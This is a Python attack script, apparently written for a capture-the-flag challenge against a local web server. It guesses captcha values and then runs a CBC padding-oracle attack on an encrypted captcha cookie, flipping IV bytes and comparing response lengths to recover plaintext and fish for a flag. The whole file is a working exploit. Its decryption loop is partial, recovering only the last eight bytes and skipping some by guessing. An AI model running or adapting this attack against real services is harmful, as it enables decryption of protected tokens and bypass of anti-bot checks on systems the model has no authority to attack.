import requests
import base64
import re

URL = "http://127.0.0.1:32869/"

# Get session
r = requests.get(URL)
captcha_b64 = r.cookies['captcha']
session = r.cookies['session']
csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', r.text).group(1)

print(f"Session: {session[:40]}...")
print(f"Captcha: {captcha_b64[:40]}...")
print(f"CSRF: {csrf}")

# Decode captcha
captcha = base64.b64decode(captcha_b64)
print(f"\nCaptcha bytes: {captcha.hex()}")
print(f"Length: {len(captcha)}")

# Try common CAPTCHA values first
print("\n[*] Testing common captcha values...")
common = ['123456', 'test', 'captcha', '000000', '111111', 'admin']

s = requests.Session()
for val in common:
    resp = s.post(URL,
        data={'username':'hacker123','captcha':val,'csrf_token':csrf,'submit':'Register'},
        cookies={'session':session,'captcha':captcha_b64},
        timeout=2)
    
    if 'FLAG{' in resp.text:
        print(f"[+] SUCCESS with '{val}'!")
        print(resp.text)
        flag = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag:
            print(f"\n*** FLAG: {flag.group(0)} ***")
        break
    elif 'Invalid' not in resp.text and 'incorrect' not in resp.text.lower():
        print(f"[?] Interesting response for '{val}': {resp.status_code} ({len(resp.text)} bytes)")

# Parse structure
iv, ct = captcha[:16], captcha[16:]
print(f"\n[*] Captcha structure:")
print(f"IV:  {iv.hex()}")
print(f"CT:  {ct.hex()}")

# Try modified oracle strategy - test specific patterns
print("\n[*] Testing padding oracle with strategic sampling...")

def oracle(test_iv):
    full = base64.b64encode(test_iv + ct).decode()
    try:
        resp = s.post(URL,
            data={'username':'x','captcha':'x','csrf_token':'x','submit':'Register'},
            cookies={'session':session,'captcha':full},
            timeout=1.5)
        return len(resp.content)
    except:
        return -1

# Get baseline with original IV
baseline = oracle(iv)
print(f"Baseline length: {baseline}")

# Test if we can detect padding errors
test_iv = bytearray(iv)
test_iv[15] ^= 1  # Flip last byte
modified = oracle(bytes(test_iv))
print(f"Modified length: {modified}")

if baseline != modified:
    print("[+] Padding oracle is ACTIVE!")
    
    # Fast decrypt - focus on last few bytes (likely padding)
    print("\n[*] Quick decrypt attempt...")
    pt = bytearray(16)
    inter = bytearray(16)
    
    # Only decrypt last 8 bytes for speed
    for pad in range(1, 9):
        pos = 16 - pad
        tiv = bytearray(iv)
        
        # Set known bytes
        for k in range(1, pad):
            tiv[16-k] = inter[16-k] ^ pad
        
        # Quick test - try padding values and common ASCII
        found = False
        for g in list(range(1, 17)) + list(range(ord('0'), ord('z')+1)):
            tiv[pos] = g
            if oracle(bytes(tiv)) != baseline:
                inter[pos] = g ^ pad
                pt[pos] = inter[pos] ^ iv[pos]
                c = chr(pt[pos]) if 32 <= pt[pos] < 127 else '?'
                print(f"Byte {pos}: {pt[pos]:02x} '{c}'")
                found = True
                break
        
        if not found:
            print(f"Byte {pos}: skipped")
            pt[pos] = pad
            inter[pos] = iv[pos] ^ pad
    
    print(f"\nPartial plaintext: {bytes(pt[8:])}")
    
    # Try to use what we have
    pv = pt[-1]
    if 1 <= pv <= 16:
        # We know padding value
        print(f"Detected padding: {pv} bytes")
else:
    print("[-] No padding oracle detected or response too similar")

print("\n[*] Attack complete. Check output above for flag.")

